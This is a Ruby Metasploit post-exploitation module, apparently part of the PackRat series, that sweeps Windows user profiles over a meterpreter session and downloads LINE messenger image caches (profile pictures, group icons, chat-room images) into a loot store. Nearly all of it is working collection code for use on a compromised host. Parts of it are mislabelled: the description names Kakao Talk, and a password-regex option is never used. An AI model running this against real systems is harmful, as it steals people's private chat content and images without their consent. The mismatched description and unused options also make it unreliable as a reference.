##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  # this associative array defines the artifacts known to PackRat
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Packrat

  APPLICATION_ARRAY =
   [
    "application": "LINE",
    "category": "chats",
    "file_artifact": [
      {
        "filetypes": "image",
        "path": "LocalAppData",
        "dir": "LINE",
        "artifact": "Cache\\p",
        "description": "Image cache for profile images of users",
        "credential_type": "images_in_folder"

      },
	{
        "filetypes": "image",
        "path": "LocalAppData",
        "dir": "LINE",
        "artifact": "Cache\\g",
        "description": "Image cache for group chat top icon",
        "credential_type": "images_in_folder"
      },
	{
        "filetypes": "image",
        "path": "LocalAppData",
        "dir": "LINE",
        "artifact": "Cache\\m",
        "description": "Image cache for images on user chat rooms",
        "credential_type": "images_in_folder"
      },
	{
        "filetypes": "image",
        "path": "LocalAppData",
        "dir": "LINE",
        "artifact": "Cache\\e",
        "description": "Image cache for imeges sent by official accounts",
        "credential_type": "images_in_folder"
      },
	{
        "filetypes": "image",
        "path": "LocalAppData",
        "dir": "LINE",
        "artifact": "Data\\pizza",
        "description": "Image cache for chat room icons (may contain fragments of member's profile picture)",
        "credential_type": "images_in_folder"
      }
    ]
   ]

  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'Line credential gatherer',
                      'Description'  => %q{
        This is a module that searches for Kakao Talk credentials on a windows machine.
      },
                      'License'      => MSF_LICENSE,
                      'Author'       =>
                        [
                          'Kazuyoshi Maruta',
                          'Z. Cliffe Schreuders', # http://z.cliffe.schreuders.org
                        ],
                      'Platform'     => ['win'],
                      'SessionTypes' => ['meterpreter']
          ))

    register_options(
      [
        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', 'true']),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('APPCATEGORY', [false, 'Category of applications to gather', 'All', APPLICATION_ARRAY.map { |x| x[:category] }.uniq.unshift('All')]),
        OptEnum.new('APPLICATION', [false, 'Specify application to gather', 'All', APPLICATION_ARRAY.map { |x| x[:application] }.uniq.unshift('All')]),
        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', APPLICATION_ARRAY.map { |x| x[:filetypes] }.uniq.unshift('All')])
      ])
  end

  def run
    print_status('Filtering based on these selections:  ')
    print_status("APPCATEGORY: #{datastore['APPCATEGORY'].capitalize}")
    print_status("APPLICATION: #{datastore['APPLICATION'].capitalize}")
    print_status("ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")
 	
	  
    # used to grab files for each user on the refmote host
    grab_user_profiles.each do |userprofile|
      APPLICATION_ARRAY.each do |app_loop|
        download(userprofile, app_loop)
      end
    end

    print_status 'PackRat credential sweep Completed'
  end
end